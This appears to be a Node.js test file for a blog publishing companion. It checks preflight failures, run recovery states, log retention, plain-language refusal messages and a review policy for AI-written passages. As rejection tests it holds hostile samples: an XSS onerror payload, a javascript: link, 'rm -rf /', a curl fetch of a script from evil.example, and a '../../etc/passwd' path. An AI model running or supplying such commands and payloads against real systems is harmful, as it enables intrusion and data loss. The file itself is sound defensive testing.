  const bad = [process.execPath, '-e', 'console.error("blyg-publish preflight: this environment cannot publish yet:");console.error("  - Ruby 2.6.10 is the one on PATH, but this site needs 3.2.1 (.ruby-version): put that Ruby first on the PATH of the program that runs this");console.error("  - BLYG_CHECKER is not set: apply needs the conformance checker (pass BLYG_CHECKER on to the program that runs this)");process.exit(1)'];
  const b = boot(rig, { config: { ...rig.home, commands: { ...rig.home.commands, check: bad } } });
  const r = (await b.start());
  assert.equal(r.ok, false); assert.equal(r.status, 409);
  assert.equal(r.error, 'Your site cannot publish right now. The companion starts a Ruby your site does not use. Put the site’s Ruby first on the companion’s PATH. The conformance checker (BLYG_CHECKER) is not available to the companion.');
  assert.deepEqual(fs.readdirSync(rig.folder), [], 'nothing written');
  assert.deepEqual(rig.calls(), []); assert.equal(b.mode(), 'idle');
  // a check that hangs is cut at its limit; one that cannot be started is a plain message
  const missing = boot(rig, { config: { ...rig.home, commands: { ...rig.home.commands, check: ['no-such-check-xyz'] } } });
  assert.match((await missing.start()).error, /The check could not be started \(ENOENT\)/);
  // a passing check lets the run go on, and gets no {note} (the environment, not a note)
  const ok = [process.execPath, '-e', 'console.log("all good")'];
  const b2 = boot(rig, { config: { ...rig.home, commands: { ...rig.home.commands, check: ok } } });
  assert.ok((await b2.start()).ok);
  await until(() => b2.mode() === 'planned', 'planned');
  assert.ok(H.validateHome({ ...rig.home, commands: { ...rig.home.commands, check: ok } }).ok);
  assert.match(H.validateHome({ ...rig.home, commands: { ...rig.home.commands, check: ['/bin/sh', '-c', 'x'] } }).errors.join(), /shell/);
  assert.equal(H.TIME_LIMITS_MS.check, 15000);
});

// A Jekyll site may keep Liquid-looking text out of what it publishes at all (the example blog's generated-publication test refuses an
// item whose content_md holds `{{` or `{%`). The note makes such text inert, but the reader still SEES it, so that site refused the post
// at the end of its apply (found by the end-to-end run, 20 minutes in). The start now refuses it at once, before anything is written.
test('a comment or a quoted passage that shows {{ or {% is refused at the start when the site is Jekyll; nothing is written or run', async t => {
  const rig = makeRig({ prepare: true }); t.after(rig.done);
  const cases = [
    thread('t1', 'A sentence.', 'I would write {{ page.title }} here.', { blyg: stamp() }),
    thread('t1', 'A passage with {% raw %} in it.', 'Plain words of mine.'),
    thread('t1', 'A sentence.', 'Typed as a reference: &#123;&#123; x', { blyg: stamp() }),
    thread('t1', 'A sentence.', 'In code: `{% include x %}`', { blyg: stamp() }),
  ];
  for (const th of cases) {
    const b = boot(rig, { page: blygPage([th]) });
    const r = (await b.start());
    assert.equal(r.status, 409, JSON.stringify(th));
    // (a code span holding them was already refused by the note writer, in its own words)
    assert.match(r.error, /`/.test(th.msgs[0].text) ? /code span or block in the comment holds “\{\{” or “\{%”/ : /shows “\{\{” or “\{%”.*Nothing was written/);
    assert.equal(b.mode(), 'idle');
  }
  assert.deepEqual(fs.readdirSync(rig.folder), [], 'no note was written');
  assert.deepEqual(rig.calls(), [], 'and nothing ran');
  // braces that do not open Liquid are fine, and a site that is not Jekyll (escape none) is not asked
  const ok = boot(rig, { page: blygPage([thread('t1', 'A sentence.', 'Sets like { {a}, {b} } and {: x} are fine.', { blyg: stamp() })]) });
  assert.ok((await ok.start()).ok);
  await until(() => ok.mode() === 'planned', 'planned');
  const rig2 = makeRig({ extra: { escape: 'none' } }); t.after(rig2.done);
  const none = boot(rig2, { page: blygPage([thread('t1', 'A sentence.', 'I would write {{ page.title }} here.', { blyg: stamp() })]) });
  assert.ok((await none.start()).ok, 'escape none: not refused');
});

// The site's own abandon can fail for good (for example: the owner already ended that run by hand, and an older site command says
// "nothing to abandon" with exit 1). The run then waits in abandon_failed, which survives a restart and offers Abandon again or
// FORGET: a move to abandoned that runs nothing on the site, so the drawer alone always reaches a clean state (the reviewer's zz-stuck).
test('a failing site abandon: abandon_failed survives a restart, offers abandon and forget; forget runs nothing and frees the companion', async t => {
  const rig = makeRig({ discard: true }); t.after(rig.done);
  const cmd = step => [process.execPath, FAKE, rig.log, rig.ctl, step, '{note}'];
  const home = { ...rig.home, commands: { ...rig.home.commands, abandon: cmd('abandon') } };
  rig.control({ publish: 'fail' });
  const b = boot(rig, { config: home });
  assert.ok((await b.start()).ok);
  await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  await b.pub.confirm({ id: v.id, token: v.token });
  await until(() => b.mode() === 'failed_publish', 'failed at publish');
  rig.control({ abandon: 'fail' });
  v = b.pub.current();
  assert.equal((await b.pub.forget({ id: v.id, token: v.token })).status, 409, 'forget is offered only after the site\'s abandon failed');
  const a = await b.pub.abandon({ id: v.id, token: v.token });
  assert.deepEqual([a.ok, a.status, a.view.mode, a.view.can], [false, 409, 'abandon_failed', ['abandon', 'forget']]);
  assert.match(a.error, /forget it here \(nothing is run on your site\)/);
  assert.equal(a.view.abandon_failure, '', 'no recognised plain line: the owner reads one sentence; the output is in the log');
  assert.match(fs.readFileSync(b.pub.log.pathOf(v.id), 'utf8'), /something broke/);
  // restart: still abandon_failed, still the same two actions; a new start is refused
  const again = () => R.createPublisher({ file: b.file, now: () => NOW, broadcast: () => {}, readConfig: () => ({ blyg_home: home }), readPage: u => b.pages.get(u), savePage: p => b.pages.set(p.url, p) });
  let pub = again();
  v = pub.current();
  assert.deepEqual([v.mode, v.can], ['abandon_failed', ['abandon', 'forget']]);
  assert.equal((await pub.start({ page: b.page, threadId: 't1', scope: 'one', shown: 'always' })).status, 409);
  // abandon again still fails: still abandon_failed (and the site's abandon ran a second time)
  const a2 = await pub.abandon({ id: v.id, token: v.token });
  assert.deepEqual([a2.ok, a2.view.mode], [false, 'abandon_failed']);
  const before = rig.calls().length;
  const f = await pub.forget({ id: v.id, token: v.token });
  assert.ok(f.ok, JSON.stringify(f));
  assert.deepEqual([f.view.mode, f.view.cleanup.outcome], ['abandoned', 'forgotten']);
  assert.match(f.view.cleanup.said, /nothing was run on your site.*troubleshooting details/s);
  assert.ok(!/--|scripts\//.test(f.view.cleanup.said), 'no command or script names for the owner');
  assert.match(fs.readFileSync(b.pub.log.pathOf(f.view.id), 'utf8'), /--unstage-note/, 'how to end it by hand is in the log, for an agent');
  assert.equal(rig.calls().length, before, 'forget ran no command');
  assert.ok(fs.existsSync(noteOf(rig, v)), 'and removed nothing');
  pub = again();
  assert.equal(pub.current().mode, 'abandoned', 'forgotten survives a restart');
  rig.control({});
  const fresh = (await pub.start({ page: b.page, threadId: 't1', scope: 'one', shown: 'always' }));
  assert.ok(fresh.ok, 'a new run may start: ' + fresh.error);
  await until(() => pub.current().mode === 'planned', 'the new run planned');
});

// Review item 8: a recorded step process that cannot be identified (ps failed when it was recorded) is never signalled and never run
// twice: the owner is offered abandon only. And the companion does not run ps on every poll: once per record, again on an action.
test('an unidentifiable earlier step (no start time recorded) is never signalled or continued; ps runs once per record, not per poll', async t => {
  const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
  const b = boot(rig, { lstartOf: () => '' });   // ps fails, as in a sandbox
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  rig.control({ publish: 'sleep' });
  await b.pub.confirm({ id: v.id, token: v.token });
  await until(() => rig.calls().filter(c => c.step === 'publish').length === 1, 'publish running');
  const sleeper = rig.calls().at(-1).pid;
  const rec = JSON.parse(fs.readFileSync(path.join(rig.out, 'run.json'), 'utf8'));
  assert.equal(rec.child.lstart, '', 'no start time could be recorded');
  const file = path.join(rig.out, 'run-u.json'); fs.writeFileSync(file, JSON.stringify(rec));
  let psCalls = 0;
  const pub = R.createPublisher({ file, now: () => NOW, broadcast: () => {}, lstartOf: pid => { psCalls++; return `T${pid}`; }, readConfig: () => ({ blyg_home: rig.home }), readPage: () => null, savePage: () => {} });
  for (let i = 0; i < 5; i++) v = pub.current();
  assert.deepEqual([v.mode, v.can, v.earlier_step], ['interrupted_publishing', ['forget'], 'unknown'], 'only Forget: abandon would run the site\'s command beside it');
  const ab = await pub.abandon({ id: v.id, token: v.token });
  assert.deepEqual([ab.status, /cannot be identified safely/.test(ab.error)], [409, true], 'abandon refused');
  const f1 = await pub.forget({ id: v.id, token: v.token });
  assert.deepEqual([f1.status, /Press Forget again to confirm/.test(f1.error), pub.current().mode], [409, true, 'interrupted_publishing'], 'forget asks a second time');
  const go = await pub.carryOn({ id: v.id, token: v.token, stop: true });
  assert.equal(go.status, 409);
  assert.match(go.error, /cannot be identified safely/);
  let alive = true; try { process.kill(-sleeper, 0); } catch { alive = false; }
  assert.ok(alive, 'the possibly reused group was not signalled');
  assert.equal(rig.calls().filter(c => c.step === 'publish').length, 1, 'and nothing ran a second time');
  // ps per poll: with a start time recorded and the group alive, five polls look once; an explicit action looks again
  const rec2 = { ...rec, child: { ...rec.child, lstart: 'T1' } };
  fs.writeFileSync(file, JSON.stringify(rec2));
  psCalls = 0;
  const pub2 = R.createPublisher({ file, now: () => NOW, broadcast: () => {}, lstartOf: () => { psCalls++; return 'T1'; }, readConfig: () => ({ blyg_home: rig.home }), readPage: () => null, savePage: () => {} });
  let w;
  for (let i = 0; i < 5; i++) w = pub2.current();
  assert.equal(w.earlier_step, 'alive');
  assert.equal(psCalls, 1, `ps ran ${psCalls} times for five polls`);
  assert.equal((await pub2.carryOn({ id: w.id, token: w.token })).status, 409, 'still running: refused without stop');
  assert.equal(psCalls, 2, 'the explicit action looked afresh');
  try { process.kill(-sleeper, 'SIGKILL'); } catch { /* gone */ }
  b.pub.stopAll();
});

// Review item 8: the pre-flight `check` runs asynchronously (the companion keeps answering) and holds the one run in a named mode,
// `checking`, in which nothing is written; a second start is refused meanwhile, and a restart during it goes back to idle.
test('the check does not block: timers run while it does, the run is `checking` (nothing written), a second start is refused, restart → idle', async t => {
  const rig = makeRig(); t.after(rig.done);
  const slow = [process.execPath, '-e', 'setTimeout(() => console.log("ok"), 900)'];
  const b = boot(rig, { config: { ...rig.home, commands: { ...rig.home.commands, check: slow } } });
  let ticks = 0;
  const timer = setInterval(() => { ticks++; }, 50);
  const first = b.start();
  await sleep(200);
  assert.equal(b.mode(), 'checking');
  assert.deepEqual(fs.readdirSync(rig.folder), [], 'nothing written while checking');
  const second = await b.start();
  assert.equal(second.status, 409, 'a second start is refused while the first one checks');
  assert.match(second.error, /already under way \(checking\)/);
  // a restart while checking (the record says checking): back to idle, nothing to abandon
  const copy = path.join(rig.out, 'run-checking.json'); fs.copyFileSync(b.file, copy);
  assert.equal(new R.RunBook({ file: copy }).mode, 'idle');
  const r = await first;
  clearInterval(timer);
  assert.ok(r.ok, r.error);
  assert.ok(ticks >= 10, `the event loop kept turning while the check ran (${ticks} ticks)`);
  await until(() => b.mode() === 'planned', 'planned');
  // a refused check goes back to idle and writes nothing
  const rig2 = makeRig(); t.after(rig2.done);
  const no = boot(rig2, { config: { ...rig2.home, commands: { ...rig2.home.commands, check: [process.execPath, '-e', 'console.log("blyg-publish preflight: this environment cannot publish yet:\\n  - BLYG_CHECKER is not set: apply needs the conformance checker"); process.exit(1)'] } } });
  const refused = await no.start();
  assert.deepEqual([refused.status, no.mode()], [409, 'idle']);
  assert.match(refused.error, /The conformance checker \(BLYG_CHECKER\) is not available to the companion\./);
  assert.deepEqual(fs.readdirSync(rig2.folder), []);
});

// Review item 6: such a link or an image is refused at the START, before anything is written or run.
test('a start whose comment links to a non-web address or holds an image is refused; nothing is written or run', async t => {
  const rig = makeRig({ prepare: true }); t.after(rig.done);
  for (const text of ['Look: [x](<javascript:alert(1)>)', 'A picture ![i](https://img.example.test/a.png)']) {
    const b = boot(rig, { page: blygPage([thread('t1', 'A sentence.', text, { blyg: stamp() })]) });
    const r = await b.start();
    assert.equal(r.status, 409, text);
    assert.match(r.error, /not a web address|images are not supported/);
  }
  assert.deepEqual(fs.readdirSync(rig.folder), []);
  assert.deepEqual(rig.calls(), []);
});

// ======================================================================================================================================
// THIS ROUND (2026-11-24, after the owner's first real use)
// ======================================================================================================================================
const EDIT = rig => ({ plan_edit: [process.execPath, FAKE, rig.log, rig.ctl, 'plan_edit', '{note}', '{changelog}'], apply_edit: [process.execPath, FAKE, rig.log, rig.ctl, 'apply_edit', '{note}', '{changelog}'],
  publish_edit: [process.execPath, FAKE, rig.log, rig.ctl, 'publish_edit', '{note}', '{changelog}'] });

test('the owner\'s view is plain: no output, no path; a failure is one recognised plain line (cleaned), or nothing; earlier attempts are not failures; the log has everything, owner-only', async t => {
  const rig = makeRig(); t.after(rig.done);
  rig.control({ plan: 'refuse' });
  const b = boot(rig);
  (await b.start()); await until(() => b.mode() === 'failed_plan', 'failed');
  let v = b.pub.current();
  assert.equal(v.failure, 'Another note is already staged in your site’s checkout. Finish or undo that publish first.', 'the site\'s refusal, in the prepared sentence');
  assert.ok(!/rb:|scripts|_notes|--/.test(JSON.stringify(v).replace(/"token":"[^"]*"/, '')), 'no stack trace, path or flag anywhere in the view');
  assert.deepEqual([v.steps, v.tries], [[{ step: 'plan', ok: false, ms: v.steps[0].ms }], 1]);
  rig.control({ plan: 'fail' });
  await b.pub.retry({ id: v.id, token: v.token }); await until(() => b.mode() === 'failed_plan' && b.pub.current().tries === 2, 'failed again');
  v = b.pub.current();
  assert.equal(v.failure, '', 'nothing recognised: the drawer says "Something went wrong while …"');
  rig.control({});
  await b.pub.retry({ id: v.id, token: v.token }); await until(() => b.mode() === 'planned', 'planned');
  v = b.pub.current();
  assert.deepEqual(v.steps.map(s => [s.step, s.ok]), [['plan', true]], 'the CURRENT attempt only: the earlier failures are not listed');
  assert.equal(v.tries, 3, 'how many times, quietly');
  const file = b.pub.log.pathOf(v.id);
  assert.equal(path.dirname(file), path.join(path.dirname(b.file), 'blyg-publish-logs'));
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
  assert.equal(fs.statSync(path.dirname(file)).mode & 0o777, 0o700);
  const lines = fs.readFileSync(file, 'utf8').trim().split('\n').map(l => JSON.parse(l));
  assert.deepEqual(lines[0].ev, 'run');
  assert.equal(lines[0].settings_fp, recOf(v).settings_fp);
  assert.ok(lines.filter(l => l.ev === 'step' && l.step === 'plan').length === 3 && lines.some(l => l.ev === 'step' && /RuntimeError/.test(l.output) && Array.isArray(l.argv) && Number.isInteger(l.ms)), 'every step: argv, exit, time, whole output');
  assert.ok(lines.some(l => l.ev === 'move' && l.from === 'planning' && l.to === 'failed_plan'), 'the moves, with times');
  assert.equal(R.plainLineOf('x\nRefused:\n  - _notes/a.md: release date 2027-01-01 is in the future (today in London is 2026-11-24)\nState: planned'), 'The note’s release date is missing or in the future.');
  assert.equal(R.plainLineOf('trace\nblyg-publish: main moved from abc1234 to def5678 after apply; run again to apply on top of it'), 'Your site changed after it was built and checked. Try again to build it again.');
});

// EVERY refusal the example site's publisher prints (scripts/blyg-publish, scripts/blyg_publish.rb: its `raise Refused`, its
// preflight problems and its plan's "Refused:" items), as it prints them, each to its ONE prepared sentence; and hostile lines.
test('the site\'s refusals: each to a fixed sentence; only lines that start with the publisher\'s own prefixes; nothing page-derived', () => {
  const N = '_notes/my-first-words.md';
  const pre = l => `blyg-publish preflight: this environment cannot publish yet:\n  - ${l}`;
  const plan = l => `Plan for ${N}:\nRefused:\n  - ${l}`;
  const SAY = Object.fromEntries(R.SITE_REFUSALS.map(r => [r.key, r.say]));
  const cases = [
    ['staged-other', `blyg-publish: ${N} is already staged by this checkout; unstage it (--unstage-note) before staging another note`],
    ['not-wip', 'blyg-publish: your checkout is on main; staging a note commits on wip, switch to wip first'],
    ['not-wip', 'blyg-publish: your checkout is on main; switch to wip first'],
    ['not-wip', pre('your checkout is on main, not wip')],
    ['not-wip', plan('your checkout is on main; publishing reads the notes from wip, switch to wip first')],
    ['note-uncommitted', `blyg-publish: ${N} is already on wip and has uncommitted changes; commit it yourself`],
    ['checkout-dirty', 'blyg-publish: your checkout has other uncommitted changes (_config.yml); commit or stash them, then stage the edit of _notes/x.md'],
    ['checkout-dirty', pre('the working tree has 2 uncommitted change(s) to tracked files: commit or stash them')],
    ['checkout-dirty', plan('the working tree has uncommitted changes; commit or stash them first:')],
    ['import-failed', 'blyg-publish: importing the note\'s sources failed:\nFailed: https://x.example/a: boom'],
    ['not-imported', plan(`${N}: quotes or answers 0abc, which is not imported; run ruby scripts/blygger.rb import --note x on wip`)],
    ['not-staged', `blyg-publish: ${N} was not staged by --stage-note (or the record is gone); nothing was changed`],
    ['record-damaged', 'blyg-publish: the record is damaged; nothing was changed'],
    ['record-damaged', 'blyg-publish: the draft record is damaged; nothing was changed'],
    ['wip-moved', 'blyg-publish: wip has moved on from the staging commit abc1234; nothing was changed'],
    ['staging-commit', 'blyg-publish: the staging commit holds more than _notes/x.md; nothing was changed'],
    ['staging-commit', 'blyg-publish: the staging commit abc1234 changes a file wip already had, so it is not one --stage-note made; nothing was changed'],
    ['staging-commit', 'blyg-publish: the staging commit is already on main; nothing was changed'],
    ['changed-after-staged', `blyg-publish: ${N} was changed after it was staged; nothing was changed`],
    ['run-for-note', 'blyg-publish: a run for this note is at applied; abandon it first (blyg-publish --abandon); nothing was changed'],
    ['lock', 'blyg-publish: another run is under way (pid 4, started x); wait for it to finish'],
    ['lock', 'blyg-publish: the lock was taken by a run on other-host (pid 4), which cannot be checked from here; remove it by hand'],
    ['lock', 'blyg-publish: the lock\'s process (pid 4) is alive, but whether it is the run that took the lock cannot be told'],
    ['lock', 'blyg-publish: /x/.git/blyg-publish.lock exists but does not say which run (pid, start time, host) holds it; remove it'],
    ['lock', pre('a lock file is present (/x/.git/blyg-publish.lock): another run holds it, or one died; see docs/BLYGGER.md')],
    ['nothing-to-abandon', 'blyg-publish: there is no unfinished run to abandon (merged_back)'],
    ['nothing-to-abandon', `Nothing to abandon for ${N}: no unfinished run is recorded (the last run is merged_back).`],
    ['other-note-run', `blyg-publish: the recorded run (applied) is for _notes/other.md, not ${N}; it was not touched. End it by hand with --abandon if it is yours.`],
    ['unfinished-run', 'blyg-publish: a publish run stopped at applied; finish it first (run it again with the same notes and --push)'],
    ['unfinished-run', 'blyg-publish: the last run stopped at applied; run with --push to continue'],
    ['unfinished-run', pre(`a run for ${N} is recorded at applied: finish it (the same --push again) or end it with --abandon`)],
    ['pushed-unrecorded', 'blyg-publish: a publish run was pushed to GitHub (it is published) but its push was not recorded; run it again'],
    ['pushed-unrecorded', 'blyg-publish: this run\'s push of abc1234 reached GitHub (it is published) but was not recorded; run it again'],
    ['plan-refused', 'blyg-publish: refused (see above); nothing was changed'],
    ['only-note', 'blyg-publish: --only-note: this plan is for more than the note and its own sources (pins: x); nothing was changed. Look at the plan above and run without --only-note.'],
    ['quick-needs-only-note', 'blyg-publish: --quick needs --only-note (it is only safe for a run proven to change nothing but the note and its own imports)'],
    ['main-behind', 'blyg-publish: GitHub main is at the pushed commit abc1234; your main is at def5678, 2 commit(s) behind'],
    ['main-behind', plan('main is behind origin/main by 3 commit(s): update main first')],
    ['main-behind', plan('could not fetch origin to compare main with GitHub')],
    ['main-behind', pre('local main is not the same commit as origin/main as last fetched: update main first (git fetch, then fast-forward main)')],
    ['main-behind', pre('there is no origin/main to compare main with (fetch once)')],
    ['changed-after-apply', 'blyg-publish: files changed after apply checked them: _config.yml; run again to apply'],
    ['changed-after-apply', 'blyg-publish: the temporary worktree is no longer at the commit apply checked; run again to apply'],
    ['changed-after-apply', 'blyg-publish: main moved from abc1234 to def5678 after apply; run again to apply on top of it'],
    ['live-mismatch', 'blyg-publish: the live site does not match the plan:\n  /b/x answers 404'],
    ['worktree-lost', 'blyg-publish: could not make the temporary worktree again at abc1234; end this run with --abandon (it says what to finish by hand)'],
    ['merge-conflict', 'blyg-publish: merging main into wip conflicts; resolve it by hand (git merge main), then run again:\nCONFLICT'],
    ['not-a-note', `blyg-publish: ${N} is not a file in this checkout`],
    ['not-a-note', `blyg-publish: ${N} resolves outside _notes/`],
    ['not-a-note', plan(`${N}: not a note on wip (expected _notes/<name>.md)`)],
    ['release-date', plan(`${N}: no release date`)],
    ['release-date', plan(`${N}: release date 2027-01-01 is in the future (today in London is 2026-11-24)`)],
    ['already-published', plan(`${N}: already on main; use --edit to publish an edit`)],
    ['not-published', plan(`${N}: not on main; publish it as a new post (without --edit)`)],
    ['nothing-changes', plan('nothing would change on main')],
    ['address-taken', plan(`${N}: its address /b/x belongs to the published _notes/y.md; renaming a published post is not supported here`)],
    ['id-clash', plan(`${N}: blyg_id 0abc already belongs to the published _notes/y.md`)],
    ['id-clash', plan(`${N}: blyg_id 0abc is not the id it was published under (0def); a published post's id never changes`)],
    ['id-clash', plan(`${N}: blyg_id 0abc is also written in _notes/y.md`)],
    ['embed', plan(`${N}: an Obsidian embed ![[x]] does not publish on this site; replace it with a link or image`)],
    ['missing-file', plan(`${N}: refers to assets/x.png, which is not in the repository`)],
    ['sitemap', 'blyg-publish: could not read https://example.com/sitemap.xml (HTTP 500)'],
    ['git-failed', 'blyg-publish: git push origin main failed:\nrejected'],
    ['not-pushed', 'blyg-publish: nothing was published (State: applied). Read the output above, then run the same --push again.'],
    ['ruby', pre('Ruby 2.6.10 is the one on PATH, but this site needs 3.2.1 (.ruby-version): put that Ruby first on the PATH of the program that runs this')],
    ['bundler', pre('bundler is not installed for this Ruby (gem install bundler)')],
    ['checker', pre('BLYG_CHECKER is not set: apply needs the conformance checker (pass BLYG_CHECKER on to the program that runs this)')],
    ['checker', pre('BLYG_CHECKER names /nowhere, which is not a folder')],
    ['checker', pre('BLYG_CHECKER (/x/lib) does not load: node cannot import check-site.mjs and find checkSite in it')],
    ['node', pre('the node command is not on PATH (the conformance checker runs on it)')],
    ['netlify', pre('there is no .netlify/state.json (the site id the deploy wait needs)')],
    ['netlify', pre('the netlify command is not on PATH')],
    ['locale', pre('the locale is LANG=C, which is not UTF-8: set LANG to a UTF-8 locale (for example en_US.UTF-8) in the environment of the program that runs this, or leave all of LC_ALL, LC_CTYPE and LANG unset')],
    ['shell-vars', plan('BLYG_SITE_ROOT, BLYG_NO_PIN is set in your shell; blyg-publish sets these itself: unset them first')],
  ];
  const filled = { 'checkout-dirty': { [cases.find(c => c[0] === 'checkout-dirty')[1]]: 'the site’s settings' } };
  for (const [key, out] of cases) {
    const want = key === 'checkout-dirty' ? SAY[key].replace('{what}', (filled[key][out]) || 'some files') : SAY[key];
    assert.equal(R.plainLineOf(`some build output\n${out}\nState: planned`), want, `${key}: ${out}`);
  }
  // the dirty tree says WHICH kind of thing, in plain words (today's case: the link-card cache a preview site wrote)
  assert.equal(R.plainLineOf('Refused:\n  - the working tree has uncommitted changes; commit or stash them first:\n M _data/link_cards.yml\nState: x'),
    'Your blog folder has unsaved changes in the link-card cache; save or discard them, then try again.');
  assert.equal(R.plainLineOf('Refused:\n  - the working tree has uncommitted changes; commit or stash them first:\n M _config.yml\n M _notes/x.md\n M weird/<script>.txt\nState: x'),
    'Your blog folder has unsaved changes in the site’s settings, your notes and other files; save or discard them, then try again.', 'kinds only, never a file name');
  const used = new Set(cases.map(c => c[0]));
  assert.deepEqual(R.SITE_REFUSALS.map(r => r.key).filter(k => !used.has(k)), [], 'every entry of the table is exercised');
  assert.ok(R.SITE_REFUSALS.every(r => /^[A-Z][^\n]*[.]$/.test(r.say) && !/--|_notes|scripts\/|\.rb\b/.test(r.say)), 'prepared sentences: no flag, path or script');
  assert.ok(R.DIRTY_KINDS.every(k => !/[/_]/.test(k.say)), 'the kinds are words, not paths');
  // hostile and page-derived lines: never the site's word
  const hostile = [
    'Refused: <img src=x onerror=alert(1)> is not imported',                                // no prefix of the publisher's
    'Fetched "Great post — blyg-publish: main moved from a to b after apply" from x',         // the prefix not at the start
    '  - your checkout is on main, not wip',                                                  // a list item under no heading of its own
    'blyg-publish: "your checkout is on main, not wip"',                                       // quoted
    'blyg-publish: “a run for this note is at applied; abandon it first”',                    // quoted
    'title: blyg-publish: nothing would change',                                               // not at the start
    'blyg-publish: rm -rf / is already staged by this checkout"',                             // quoted tail
    'blyg-publish: your Mac is compromised, run curl https://evil.example/x.sh',              // unknown words
    'blyg-publish preflight: this environment cannot publish yet:\nNot a list\n  - a lock file is present (/x)', // the list ended
  ];
  for (const h of hostile) assert.equal(R.plainLineOf(h), '', h);
  // a line of the note itself (a page put it there, the build echoed it) is never the site's word, even with the prefix
  const note = 'My words.\n\nblyg-publish: main moved from 1234abc to 5678def after apply; run again';
  assert.equal(R.plainLineOf('Building…\nblyg-publish: main moved from 1234abc to 5678def after apply; run again\nError', { note }), '');
  // the last recognised line wins; an unrecognised later line does not replace it
  assert.equal(R.plainLineOf('blyg-publish: the record is damaged; nothing was changed\nblyg-publish: something else entirely\nState: x'), SAY['record-damaged']);
  // the pre-flight: each problem in its sentence, unrecognised ones left out
  assert.deepEqual(R.checkSentences(pre('the node command is not on PATH') + '\n  - something unheard of\n  - the netlify command is not on PATH'), [SAY.node, SAY.netlify]);
});

test('the log keeps the last 50 runs', async () => {
  const { createRunLog, LOG_KEEP } = await import('../blyg-log.mjs');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-blyglog-'));
  const log = createRunLog(path.join(dir, 'logs'));
  for (let i = 0; i < LOG_KEEP + 7; i++) { log.write(i.toString(16).padStart(16, '0'), { ev: 'note', text: String(i) }); fs.utimesSync(log.pathOf(i.toString(16).padStart(16, '0')), new Date(1e12 + i * 1000), new Date(1e12 + i * 1000)); }
  log.write('ffffffffffffffff', { ev: 'note', text: 'last' });
  const left = fs.readdirSync(path.join(dir, 'logs'));
  assert.equal(left.length, LOG_KEEP);
  assert.ok(left.includes('ffffffffffffffff.jsonl') && !left.includes('0000000000000000.jsonl'), 'the oldest go');
  log.write('../../etc/passwd', { ev: 'note' });
  assert.equal(fs.readdirSync(path.join(dir, 'logs')).length, LOG_KEEP, 'a run id that is not one is never a file name');
  fs.rmSync(dir, { recursive: true, force: true });
});

test('THE LOOK POLICY (2026-11-25): with confirm never an agent-written passage publishes straight in its box (the reason is recorded); only LOOK_FORCED stops it', async t => {
  const rig = makeRig({ confirm: 'never', extra: { plan_guard: ['--only-note', '--quick'] } }); t.after(rig.done);
  const withGap = { id: 't1', quote: 'q', blyg: stamp(), msgs: [mine('Mine. /tk(say it)', { gaps: [{ id: 'g0', kind: 'ask', agent: 'claude', instruction: 'say it', mode: 'filled-by-agent', text: 'Said.', model: 'claude-x', at: '2026-11-24T10:00:00Z' }] })] };
  const b = boot(rig, { page: blygPage([withGap]) });
  const r = await b.start('t1', 'one', 'never');
  assert.ok(r.ok, r.error);
  assert.deepEqual([r.view.confirm, r.view.review, r.view.reasons], ['never', 'none', ['agent-text']], 'no look forced; why is recorded');
  await until(() => b.mode() === 'published', 'published');
  assert.deepEqual(rig.calls().map(c => c.step), ['plan', 'apply', 'publish']);
  assert.deepEqual(b.pub.current().reading.map(p => p.kind), ['words', 'agent', 'quote'], 'the box is in the preview');
  assert.deepEqual(b.pub.current().reading[1], { kind: 'agent', by: 'ai', name: 'Written by an AI model', text: 'Said.' }, 'the box says who in words, never a name');
  assert.deepEqual(b.pub.current().reading.map(p => p.kind), ['words', 'agent', 'quote'], 'the box stands on its own between the words and the quote');
  assert.deepEqual([R.reviewFor('never'), R.reviewFor('always'), R.reviewFor('never', { agentText: true }), R.reviewFor('always', { agentText: true })],
    [{ confirm: 'never', review: 'none', reasons: [] }, { confirm: 'always', review: 'setting', reasons: [] }, { confirm: 'never', review: 'none', reasons: ['agent-text'] },
      { confirm: 'always', review: 'setting', reasons: ['agent-text'] }]);
  // THE ONE POLICY: only what would lose something already published without the owner asking forces a look under one click
  assert.deepEqual(R.LOOK_FORCED, ['left-out', 'outside', 'notes-read']);
  for (const f of ['agentText', 'linkStub', 'further']) assert.equal(R.reviewFor('never', { [f]: true }).review, 'none', f);
  assert.deepEqual(R.reviewFor('never', { leftOut: true, agentText: true }), { confirm: 'always', review: 'left-out', reasons: ['agent-text', 'left-out'] });
  assert.deepEqual(R.reviewFor('never', { outside: true }), { confirm: 'always', review: 'outside', reasons: ['outside'] });
  assert.deepEqual(R.reviewFor('never', { asked: true }), { confirm: 'always', review: 'asked', reasons: [] }, 'the owner asked to look at a set-aside post');
  assert.deepEqual([b.pub.current().pace, R.paceOf(['--only-note']), b.pub.current().full_minutes], ['quick', 'full', null], 'quick with the site\'s quick flag; no guess at minutes when none is recorded');
});

test('A PASSAGE WRITTEN FROM THE OWNER\'S NOTES forces a look whatever confirm says (notes-read); a queued press is set aside unwritten; a web-only passage does not', async t => {
  const rig = makeRig({ confirm: 'never', extra: { plan_guard: ['--only-note', '--quick'] } }); t.after(rig.done);
  const gapOf = used => ({ id: 'g0', kind: 'ask', agent: 'claude', instruction: 'say it', mode: 'filled-by-agent', text: 'Said.', model: 'claude-x', at: '2026-11-24T10:00:00Z', used });
  const thread = used => ({ id: 't1', quote: 'q', blyg: stamp(), msgs: [mine('Mine. /tk(say it)', { gaps: [gapOf(used)] })] });
  assert.deepEqual(R.reviewFor('never', { notesRead: true, agentText: true }), { confirm: 'always', review: 'notes-read', reasons: ['agent-text', 'notes-read'] });
  assert.equal(R.reviewFor('always', { notesRead: true }).review, 'notes-read');
  assert.equal(R.notesReadIn([{ agent: 'claude' }, { agent: 'claude', notes_read: true }]), true);
  // at the dialog: it stops at planned for the look
  const b = boot(rig, { page: blygPage([thread('both')]) });
  const r = await b.start('t1', 'one', 'never');
  assert.ok(r.ok, r.error);
  assert.deepEqual([r.view.confirm, r.view.review], ['always', 'notes-read']);
  assert.ok(r.view.reasons.includes('notes-read'));
  await until(() => b.mode() === 'planned', 'planned');
  assert.deepEqual(rig.calls().map(c => c.step), ['plan'], 'nothing published before the look');
  assert.ok(!fs.readFileSync(noteOf(rig, r.view), 'utf8').includes('notes_read'), 'never written into the note');
  // pressed and away (the queue, the Hub): set aside before anything is written
  const rig2 = makeRig({ confirm: 'never', extra: { plan_guard: ['--only-note', '--quick'] } }); t.after(rig2.done);
